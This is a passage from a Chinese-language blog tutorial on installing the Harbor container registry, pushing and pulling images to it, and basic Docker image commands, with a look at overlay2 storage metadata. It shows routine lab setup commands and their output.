class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">输出<span class="token namespace">[Step 0]</span>: checking <span class="token keyword">if</span> docker is installed <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Note: docker version: 20<span class="token punctuation">.</span>10<span class="token punctuation">.</span>12<span class="token namespace">[Step 1]</span>: checking docker-compose is installed <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Note: docker-compose version: 1<span class="token punctuation">.</span>25<span class="token punctuation">.</span>0<span class="token namespace">[Step 2]</span>: loading Harbor images <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token namespace">[Step 3]</span>: preparing environment <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token namespace">[Step 4]</span>: preparing harbor configs <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>prepare base <span class="token function">dir</span> is <span class="token function">set</span> to <span class="token operator">/</span>root/harbor<span class="token namespace">[Step 5]</span>: starting Harbor <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Creating network <span class="token string">"harbor_harbor"</span> with the default driverCreating harbor-log <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating harbor-db     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating registry      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating registryctl   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating redis         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating harbor-portal <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating harbor-core   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating harbor-jobservice <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> doneCreating nginx             <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> done✔ <span class="token operator">--</span><span class="token operator">--</span>Harbor has been installed and started successfully<span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-7-验证运行情况"><a href="#2-2-7-验证运行情况" class="headerlink" title="2.2.7 验证运行情况"></a>2.2.7 验证运行情况</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE                                COMMAND                  CREATED              STATUS                        PORTS                                                                            NAMES71c0db683e4a   goharbor/nginx-photon:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1         <span class="token string">"nginx -g 'daemon of…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:80-&gt;8080/tcp<span class="token punctuation">,</span> :::80-&gt;8080/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:443-&gt;8443/tcp<span class="token punctuation">,</span> :::443-&gt;8443/tcp   nginx4e3b53a86f01   goharbor/harbor-jobservice:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1    <span class="token string">"/harbor/entrypoint.…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    harbor-jobservicedf76e1eabbf7   goharbor/harbor-core:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1          <span class="token string">"/harbor/entrypoint.…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    harbor-coreeeb4d224dfc4   goharbor/harbor-portal:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1        <span class="token string">"nginx -g 'daemon of…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    harbor-portal70e162c38b59   goharbor/redis-photon:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1         <span class="token string">"redis-server /etc/r…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    redis8bcc0e9b06ec   goharbor/harbor-registryctl:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1   <span class="token string">"/home/harbor/start.…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    registryctld88196398df7   goharbor/registry-photon:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1      <span class="token string">"/home/harbor/entryp…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    registryed5ba2ba9c82   goharbor/harbor-db:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1            <span class="token string">"/docker-entrypoint.…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>                                                                                    harbor-dbdcb4b57c7542   goharbor/harbor-log:v2<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1           <span class="token string">"/bin/sh -c /usr/loc…"</span>   About a minute ago   Up About a minute <span class="token punctuation">(</span>healthy<span class="token punctuation">)</span>   127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:1514-&gt;10514/tcp                                                        harbor-log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-8-访问harbor-UI界面"><a href="#2-2-8-访问harbor-UI界面" class="headerlink" title="2.2.8 访问harbor UI界面"></a>2.2.8 访问harbor UI界面</h3><h4 id="2-2-8-1-在物理机通过浏览器访问"><a href="#2-2-8-1-在物理机通过浏览器访问" class="headerlink" title="2.2.8.1 在物理机通过浏览器访问"></a>2.2.8.1 在物理机通过浏览器访问</h4><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126000804490.png" alt="image-20220126000804490"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126000825616.png" alt="image-20220126000825616"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126000840905.png" alt="image-20220126000840905"></p><h4 id="2-2-8-2-在Docker-Host主机通过域名访问"><a href="#2-2-8-2-在Docker-Host主机通过域名访问" class="headerlink" title="2.2.8.2 在Docker Host主机通过域名访问"></a>2.2.8.2 在Docker Host主机通过域名访问</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">添加域名解析<span class="token comment"># vim /etc/hosts</span><span class="token comment"># cat /etc/hosts</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1   localhost localhost<span class="token punctuation">.</span>localdomain localhost4 localhost4<span class="token punctuation">.</span>localdomain4::1         localhost localhost<span class="token punctuation">.</span>localdomain localhost6 localhost6<span class="token punctuation">.</span>localdomain6192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>10<span class="token punctuation">.</span>155 www<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126001253192.png" alt="image-20220126001253192"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126001447862.png" alt="image-20220126001447862"></p><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126001510880.png" alt="image-20220126001510880"></p><h1 id="三、docker镜像上传至Harbor及从harbor下载"><a href="#三、docker镜像上传至Harbor及从harbor下载" class="headerlink" title="三、docker镜像上传至Harbor及从harbor下载"></a>三、docker镜像上传至Harbor及从harbor下载</h1><h2 id="3-1-修改docker-daemon使用harbor"><a href="#3-1-修改docker-daemon使用harbor" class="headerlink" title="3.1  修改docker daemon使用harbor"></a>3.1  修改docker daemon使用harbor</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">添加<span class="token operator">/</span>etc/docker/daemon<span class="token punctuation">.</span>json文件，默认不存在，需要手动添加<span class="token comment"># vim /etc/docker/daemon.json</span><span class="token comment"># cat /etc/docker/daemon.json</span><span class="token punctuation">{</span>        <span class="token string">"insecure-registries"</span>: <span class="token punctuation">[</span><span class="token string">"www.kubemsb.com"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">重启加载daemon配置<span class="token comment"># systemctl daemon-reload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">重启docker<span class="token comment"># systemctl restart docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-docker-tag"><a href="#3-2-docker-tag" class="headerlink" title="3.2 docker tag"></a>3.2 docker tag</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已有容器镜像文件<span class="token comment"># docker images</span>REPOSITORY                      TAG       IMAGE ID       CREATED        SIZEcentos                          latest    5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">为已存在镜像重新添加tag<span class="token comment"># docker tag centos:latest www.kubemsb.com/library/centos:v1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">再次查看本地容器镜像<span class="token comment"># docker images</span>REPOSITORY                       TAG       IMAGE ID       CREATED        SIZEcentos                           latest    5d0da3dc9764   4 months ago   231MBwww<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com/library/centos   v1        5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-docker-push"><a href="#3-3-docker-push" class="headerlink" title="3.3 docker push"></a>3.3 docker push</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker login www.kubemsb.com</span>Username: admin  用户名 adminPassword:        密码   12345WARNING! Your password will be stored unencrypted in <span class="token operator">/</span>root/<span class="token punctuation">.</span>docker/config<span class="token punctuation">.</span>json<span class="token punctuation">.</span>Configure a credential helper to remove this warning<span class="token punctuation">.</span> Seehttps:<span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>docker<span class="token punctuation">.</span>com/engine/reference/commandline/login/<span class="token comment">#credentials-store</span>Login Succeeded 登陆成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">推送本地容器镜像到harbor仓库<span class="token comment"># docker push www.kubemsb.com/library/centos:v1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93.assets/image-20220126002747864.png" alt="image-20220126002747864"></p><h2 id="3-4-docker-pull"><a href="#3-4-docker-pull" class="headerlink" title="3.4 docker pull"></a>3.4 docker pull</h2><blockquote><p>在其它主机上下载或使用harbor容器镜像仓库中的容器镜像</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在本地添加域名解析<span class="token comment"># vim /etc/hosts</span><span class="token comment"># cat /etc/hosts</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1   localhost localhost<span class="token punctuation">.</span>localdomain localhost4 localhost4<span class="token punctuation">.</span>localdomain4::1         localhost localhost<span class="token punctuation">.</span>localdomain localhost6 localhost6<span class="token punctuation">.</span>localdomain6192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>10<span class="token punctuation">.</span>155 www<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">在本地添加<span class="token operator">/</span>etc/docker/daemon<span class="token punctuation">.</span>json文件，其中为本地主机访问的容器镜像仓库<span class="token comment"># vim /etc/docker/daemon.json</span><span class="token comment"># cat /etc/docker/daemon.json</span><span class="token punctuation">{</span>        <span class="token string">"insecure-registries"</span>: <span class="token punctuation">[</span><span class="token string">"www.kubemsb.com"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># systemctl daemon-reload</span><span class="token comment"># systemctl restart docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">下载容器镜像<span class="token comment"># docker pull www.kubemsb.com/library/centos:v1</span>v1: Pulling <span class="token keyword">from</span> library/centosDigest: sha256:a1801b843b1bfaf77c501e7a6d3f709401a1e0c83863037fa3aab063a7fdb9dcStatus: Downloaded newer image <span class="token keyword">for</span> www<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com/library/centos:v1www<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com/library/centos:v1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已下载的容器镜像<span class="token comment"># docker images</span>REPOSITORY                       TAG       IMAGE ID       CREATED        SIZEwww<span class="token punctuation">.</span>kubemsb<span class="token punctuation">.</span>com/library/centos   v1        5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/04-docker-he-xin-gai-nian-rong-qi-jing-xiang-jing-xiang-cang-ku-cao-zuo-shi-zhan/02-rong-qi-jing-xiang-jie-shao-ji-ying-yong/docker-rong-qi-jing-xiang/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/54-rong-qi-guan-li-gong-ju-docker/04-docker-he-xin-gai-nian-rong-qi-jing-xiang-jing-xiang-cang-ku-cao-zuo-shi-zhan/02-rong-qi-jing-xiang-jie-shao-ji-ying-yong/docker-rong-qi-jing-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker容器镜像"><a href="#Docker容器镜像" class="headerlink" title="Docker容器镜像"></a>Docker容器镜像</h1><h1 id="一、Docker容器镜像操作"><a href="#一、Docker容器镜像操作" class="headerlink" title="一、Docker容器镜像操作"></a>一、Docker容器镜像操作</h1><h2 id="2-1-查看本地容器镜像"><a href="#2-1-查看本地容器镜像" class="headerlink" title="2.1 查看本地容器镜像"></a>2.1 查看本地容器镜像</h2><h3 id="2-1-1-使用docker-images命令查看"><a href="#2-1-1-使用docker-images命令查看" class="headerlink" title="2.1.1 使用docker images命令查看"></a>2.1.1 使用docker images命令查看</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEbash         latest    5557e073f11c   2 weeks ago    13MBnginx        latest    605c77e624dd   3 weeks ago    141MBcentos       latest    5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1-2-使用docker-image命令查看"><a href="#2-1-2-使用docker-image命令查看" class="headerlink" title="2.1.2 使用docker image命令查看"></a>2.1.2 使用docker image命令查看</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker image list</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEbash         latest    5557e073f11c   2 weeks ago    13MBnginx        latest    605c77e624dd   3 weeks ago    141MBcentos       latest    5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1-3-查看docker容器镜像本地存储位置"><a href="#2-1-3-查看docker容器镜像本地存储位置" class="headerlink" title="2.1.3 查看docker容器镜像本地存储位置"></a>2.1.3 查看docker容器镜像本地存储位置</h3><blockquote><p>考虑到docker容器镜像会占用本地存储空间，建议搭建其它存储系统挂载到本地以便解决占用大量本地存储的问题。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /var/lib/docker</span>buildkit  containers  image  network  overlay2  plugins  runtimes  swarm  tmp  trust  volumes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-2-搜索Docker-Hub容器镜像"><a href="#2-2-搜索Docker-Hub容器镜像" class="headerlink" title="2.2 搜索Docker Hub容器镜像"></a>2.2 搜索Docker Hub容器镜像</h2><h3 id="2-2-1-命令行搜索"><a href="#2-2-1-命令行搜索" class="headerlink" title="2.2.1 命令行搜索"></a>2.2.1 命令行搜索</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker search centos</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">输出NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDcentos                            The official build of CentOS<span class="token punctuation">.</span>                   6987      <span class="token namespace">[OK]</span>ansible/centos7-ansible           Ansible on Centos7                              135                  <span class="token namespace">[OK]</span>consol/centos-xfce-vnc            Centos container with <span class="token string">"headless"</span> VNC session…   135                  <span class="token namespace">[OK]</span>jdeathe/centos-ssh                OpenSSH <span class="token operator">/</span> Supervisor <span class="token operator">/</span> EPEL/IUS/SCL Repos <span class="token operator">-</span> …   121                  <span class="token namespace">[OK]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-2-Docker-Hub-Web界面搜索"><a href="#2-2-2-Docker-Hub-Web界面搜索" class="headerlink" title="2.2.2 Docker Hub Web界面搜索"></a>2.2.2 Docker Hub Web界面搜索</h3><p><img src="Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F.assets/image-20220124162022990.png" alt="image-20220124162022990"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F.assets/image-20220124162116338.png" alt="image-20220124162116338"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F.assets/image-20220124162200273.png" alt="image-20220124162200273"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F.assets/image-20220124162312918.png" alt="image-20220124162312918"></p><h2 id="2-3-Docker-容器镜像下载"><a href="#2-3-Docker-容器镜像下载" class="headerlink" title="2.3 Docker 容器镜像下载"></a>2.3 Docker 容器镜像下载</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker pull centos</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-Docker容器镜像删除方法"><a href="#2-4-Docker容器镜像删除方法" class="headerlink" title="2.4 Docker容器镜像删除方法"></a>2.4 Docker容器镜像删除方法</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEbash         latest    5557e073f11c   2 weeks ago    13MBnginx        latest    605c77e624dd   3 weeks ago    141MBcentos       latest    5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker rmi centos</span>Untagged: centos:latestUntagged: centos@sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177Deleted: sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6Deleted: sha256:74ddd0ec08fa43d09f32636ba91a0a3053b02cb4627c35051aff89f853606b59<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEcentos       latest    5d0da3dc9764   4 months ago   231MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker rmi 5d0da3dc9764</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="二、Docker容器镜像介绍"><a href="#二、Docker容器镜像介绍" class="headerlink" title="二、Docker容器镜像介绍"></a>二、Docker容器镜像介绍</h1><h2 id="2-1-Docker-Image"><a href="#2-1-Docker-Image" class="headerlink" title="2.1 Docker Image"></a>2.1 Docker Image</h2><ul><li>Docker 镜像是只读的容器模板，是Docker容器基础</li><li>为Docker容器提供了静态文件系统运行环境（rootfs）</li><li>是容器的静止状态</li><li>容器是镜像的运行状态</li></ul><h2 id="2-2-联合文件系统"><a href="#2-2-联合文件系统" class="headerlink" title="2.2 联合文件系统"></a>2.2 联合文件系统</h2><h3 id="2-2-1-联合文件系统定义"><a href="#2-2-1-联合文件系统定义" class="headerlink" title="2.2.1 联合文件系统定义"></a>2.2.1 联合文件系统定义</h3><ul><li>联合文件系统(union filesystem)</li><li>联合文件系统是实现联合挂载技术的文件系统</li><li>联合挂载技术可以实现在一个挂载点同时挂载多个文件系统，将挂载点的原目录与被挂载内容进行整合，使得最终可见的文件系统包含整合之后的各层文件和目录</li></ul><h3 id="2-2-2-图解"><a href="#2-2-2-图解" class="headerlink" title="2.2.2 图解"></a>2.2.2 图解</h3><p><img src="Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F.assets/image-20220125080435098.png" alt="image-20220125080435098"></p><h2 id="2-3-Docker-Overlay2"><a href="#2-3-Docker-Overlay2" class="headerlink" title="2.3 Docker Overlay2"></a>2.3 Docker Overlay2</h2><p>容器文件系统有多种存储驱动实现方式：aufs，devicemapper，overlay，overlay2 等，本次以overlay2为例进行说明。</p><h3 id="2-3-1-概念"><a href="#2-3-1-概念" class="headerlink" title="2.3.1 概念"></a>2.3.1 概念</h3><ul><li>registry/repository： registry 是 repository 的集合，repository 是镜像的集合。</li><li>image：image 是存储镜像相关的元数据，包括镜像的架构，镜像默认配置信息，镜像的容器配置信息等等。它是“逻辑”上的概念，并无物理上的镜像文件与之对应。</li><li>layer：layer(镜像层) 组成了镜像，单个 layer 可以被多个镜像共享。</li></ul><p><img src="Docker%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F.assets/image-20220125082226414.png" alt="image-20220125082226414"></p><h3 id="2-3-2-查看Docker-Host存储驱动方式"><a href="#2-3-2-查看Docker-Host存储驱动方式" class="headerlink" title="2.3.2 查看Docker Host存储驱动方式"></a>2.3.2 查看Docker Host存储驱动方式</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker info | grep overlay</span> Storage Driver: overlay2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-3-3-了解images分层"><a href="#2-3-3-了解images分层" class="headerlink" title="2.3.3 了解images分层"></a>2.3.3 了解images分层</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker pull nginx</span><span class="token keyword">Using</span> default tag: latestlatest: Pulling <span class="token keyword">from</span> library/nginxa2abf6c4d29d: Pull completea9edb18cadd1: Pull complete589b7251471a: Pull complete186b1aaa4aa6: Pull completeb4df32aa5a72: Pull completea0bcbecc962e: Pull completeDigest: sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31Status: Downloaded newer image <span class="token keyword">for</span> nginx:latestdocker<span class="token punctuation">.</span>io/library/nginx:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到上述下载的镜像分为6层，如何找到这6层存储在Docker Host哪个位置呢？</p><p>首先查看nginx镜像</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker images</span>REPOSITORY   TAG       IMAGE ID       CREATED        SIZEnginx        latest    605c77e624dd   3 weeks ago    141MB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过其Image ID 605c77e624dd 就可以找到存储位置</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># ls /var/lib/docker/image/overlay2/</span>distribution  imagedb  layerdb  repositories<span class="token punctuation">.</span>json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个目录是查找的入口，非常重要。它存储了镜像管理的元数据。</p><ul><li>repositories.json 记录了 repo 与镜像 ID 的映射关系</li><li>imagedb 记录了镜像架构，操作系统，构建镜像的容器 ID 和配置以及 rootfs 等信息</li><li>layerdb 记录了每层镜像层的元数据。</li></ul><p>通过短 ID 查找 repositories.json 文件，找到镜像 nginx 的长 ID，通过长 ID 在 imagedb 中找到该镜像的元数据：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/repositories.json | grep 605c77e624dd</span><span class="token punctuation">{</span><span class="token string">"Repositories"</span>:<span class="token string">"nginx"</span>:<span class="token punctuation">{</span><span class="token string">"nginx:latest"</span>:<span class="token string">"sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85"</span><span class="token punctuation">,</span><span class="token string">"nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31"</span>:<span class="token string">"sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># cat /var/lib/docker/image/overlay2/imagedb/content/sha256/605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token string">"os"</span>:<span class="token string">"linux"</span><span class="token punctuation">,</span><span class="token string">"rootfs"</span>:<span class="token punctuation">{</span><span class="token string">"type"</span>:<span class="token string">"layers"</span><span class="token punctuation">,</span><span class="token string">"diff_ids"</span>:<span class="token punctuation">[</span><span class="token string">"sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f"</span><span class="token punctuation">,</span><span class="token string">"sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8"</span><span class="token punctuation">,</span><span class="token string">"sha256:b8d6e692a25e11b0d32c5c3dd544b71b1085ddc1fddad08e68cbd7fda7f70221"</span><span class="token punctuation">,</span><span class="token string">"sha256:f1db227348d0a5e0b99b15a096d930d1a69db7474a1847acbc31f05e4ef8df8c"</span><span class="token punctuation">,</span><span class="token 